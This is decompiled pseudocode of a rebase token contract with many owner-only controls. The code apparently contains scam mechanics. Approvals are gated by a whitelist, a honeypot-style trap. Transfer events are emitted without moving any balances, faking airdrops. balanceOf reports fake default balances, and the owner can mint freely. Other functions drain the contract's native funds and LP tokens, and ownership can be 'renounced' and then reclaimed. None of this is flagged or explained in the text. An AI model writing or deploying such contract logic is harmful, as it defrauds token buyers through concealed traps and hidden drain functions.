contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#  - transfer(address arg1, uint256 arg2)
#
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
address stor2;
address owner; offset 8
uint256 stor2; offset 8
address stor3;
uint256 unlockTime;
address masterAddress;
address lpAddress;
uint8 stor7; offset 160
uint128 stor7; offset 160
address lpContractAddress;
mapping of uint8 stor8;
uint256 transactionTax;
uint256 buybackLimit;
uint256 buybackDivisor;
uint256 numTokensSellDivisor;
address uniswapV2RouterAddress;
address uniswapV2PairAddress;
address uniswapV2PairAddress;
address deadAddress;
uint8 swapAndLiquifyEnabled; offset 168
uint8 buyBackEnabled; offset 176
uint128 stor17; offset 176
uint128 stor17; offset 168
address marketingAddress;
mapping of uint8 stor18;
uint256 totalSupply;
uint256 stor21;
uint256 _gonsPerFragment;
mapping of uint256 stor23;
mapping of uint256 allowance;

function name() {
    return name[0 len name.length]
}

function uniswapV2Router() {
    return uniswapV2RouterAddress
}

function totalSupply() {
    return totalSupply
}

function deadAddress() {
    return deadAddress
}

function uniswapV2PairAddress() {
    return uniswapV2PairAddress
}

function lp() {
    return lpAddress
}

function decimals() {
    return decimals
}

function uniswapV2Pair() {
    return uniswapV2PairAddress
}

function swapAndLiquifyEnabled() {
    return bool(swapAndLiquifyEnabled)
}

function getUnlockTime() {
    return unlockTime
}

function buyBackEnabled() {
    return bool(buyBackEnabled)
}

function buybackLimit() {
    return buybackLimit
}

function lpContract() {
    return lpContractAddress
}

function owner() {
    return owner
}

function symbol() {
    return symbol[0 len symbol.length]
}

function marketingAddress() {
    return marketingAddress
}

function transactionTax() {
    return transactionTax
}

function _gonsPerFragment() {
    return _gonsPerFragment
}

function numTokensSellDivisor() {
    return numTokensSellDivisor
}

function initialDistributionFinished() {
    return bool(uint8(stor7.field_160))
}

function buybackDivisor() {
    return buybackDivisor
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function master() {
    return masterAddress
}

function _fallback() payable {
  stop
}

function isOwner() {
    return (msg.sender == owner)
}

function sub_01648d31(?) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    stor21 = arg1
}

function setInitialDistributionFinished() {
    require msg.sender == owner
    Mask(96, 0, stor7.field_160) = 1
}

function renounceOwnership() {
    require msg.sender == owner
    emit OwnershipRenounced(owner);
    owner = 0
}

function setInitialDistributionFinishedClose() {
    require msg.sender == owner
    Mask(96, 0, stor7.field_160) = 0
}

function lock() {
    require msg.sender == owner
    stor3 = owner
    owner = 0
    emit OwnershipRenounced(owner);
}

function setBuyBackLimit(uint256 arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    buybackLimit = arg1
}

function setBuyBackDivisor(uint256 arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    buybackDivisor = arg1
}

function enableTransfer(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    stor8[address(arg1)] = 1
}

function excludeAddress(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    stor18[address(arg1)] = 1
}

function setMaster(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    masterAddress = arg1
    return 0
}

function excludeAddressRemove(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    stor18[address(arg1)] = 0
}

function setnumTokensSellDivisor(uint256 arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    numTokensSellDivisor = arg1
}

function setBuyBackEnabled(bool arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    Mask(80, 0, stor17.field_176) = Mask(80, 0, arg1)
}

function setLP(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    lpAddress = arg1
    lpContractAddress = arg1
    return 0
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    require arg1
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function setSwapAndLiquifyEnabled(bool arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    Mask(88, 0, stor17.field_168) = Mask(88, 0, arg1)
    emit SwapEnabled(arg1);
}

function burnBNB(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    call arg1 with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not uint8(stor7.field_160):
        if owner != msg.sender:
            require stor8[address(msg.sender)]
    require msg.sender
    require arg1
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function recoverWrongTokens(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    require ext_code.size(arg1)
    call arg1.0xa9059cbb with:
         gas gas_remaining wei
        args msg.sender, arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    require _gonsPerFragment > 0
    if stor23[address(arg1)]:
        if _gonsPerFragment:
            return (stor23[address(arg1)] / _gonsPerFragment)
    else:
        if _gonsPerFragment:
            return (stor21 / _gonsPerFragment)
    ('iszero', ('stor', ('name', '_gonsPerFragment', 22)))
    revert
}

function unlock() {
    if stor3 != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0xfe596f7520646f6ee28099742068617665207065726d697373696f6e20746f20756e6c6f63,
                    mem[201 len 27]
    if block.timestamp <= unlockTime:
        revert with 0, 'Contract is locked until 7 days'
    emit OwnershipTransferred(owner, stor3);
    Mask(248, 0, stor2.field_8) = stor3
}

function increaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not uint8(stor7.field_160):
        if owner != msg.sender:
            require stor8[address(msg.sender)]
    require allowance[address(msg.sender)][address(arg1)] + arg2 >= allowance[address(msg.sender)][address(arg1)]
    require msg.sender
    require arg1
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not uint8(stor7.field_160):
        if owner != msg.sender:
            require stor8[address(msg.sender)]
    if arg2 >= allowance[address(msg.sender)][address(arg1)]:
        allowance[address(msg.sender)][address(arg1)] = 0
    else:
        require arg2 <= allowance[address(msg.sender)][address(arg1)]
        allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval(allowance[address(msg.sender)][address(arg1)], msg.sender, arg1);
    return 1
}

function sub_49848406(?) {
    require calldata.size - 4 >= 96
    require arg2 <= 4294967296
    require arg2 + 36 <= calldata.size
    require arg2.length <= 4294967296 and arg2 + (32 * arg2.length) + 36 <= calldata.size
    mem[128 len 32 * arg2.length] = call.data[arg2 + 36 len 32 * arg2.length]
    mem[(32 * arg2.length) + 128] = 0
    require msg.sender == owner
    idx = 0
    while idx < arg2.length:
        require idx < arg2.length
        _9 = mem[(32 * idx) + 128]
        mem[(32 * arg2.length) + 128] = arg3
        emit Transfer(arg3, arg1, address(_9));
        idx = idx + 1
        continue 
}

function sub_ac685543(?) {
    require calldata.size - 4 >= 64
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    require msg.sender == owner
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        _9 = mem[(32 * idx) + 128]
        mem[(32 * arg1.length) + 128] = arg2
        emit Transfer(arg2, this.address, address(_9));
        idx = idx + 1
        continue 
}

function burnAutoLP() {
    require msg.sender == owner
    require ext_code.size(uniswapV2PairAddress)
    staticcall uniswapV2PairAddress.0x70a08231 with:
            gas gas_remaining wei
           args this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_code.size(uniswapV2PairAddress)
    call uniswapV2PairAddress.0xa9059cbb with:
         gas gas_remaining wei
        args address(stor2.field_0), ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
}

function rebase(uint256 arg1, int256 arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == masterAddress
    if arg2:
        if arg2 >= 0:
            require totalSupply + arg2 >= totalSupply
        else:
            require -arg2 <= totalSupply
        totalSupply += arg2
        if totalSupply > test266151307():
            totalSupply = test266151307()
        require totalSupply > 0
        require totalSupply
        _gonsPerFragment = 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / totalSupply
        require ext_code.size(lpContractAddress)
        call lpContractAddress.sync() with:
             gas gas_remaining wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
    emit LogRebase(totalSupply, arg1);
    return totalSupply
}

function batchTransferToken(address[] arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    require msg.sender == owner
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        require stor23[mem[(32 * idx) + 140 len 20]] + arg2 >= stor23[mem[(32 * idx) + 140 len 20]]
        require idx < arg1.length
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 23
        stor23[mem[(32 * idx) + 140 len 20]] += arg2
        require idx < arg1.length
        _21 = mem[(32 * idx) + 128]
        mem[(32 * arg1.length) + 128] = arg2
        emit Transfer(arg2, this.address, address(_21));
        idx = idx + 1
        continue 
}



}
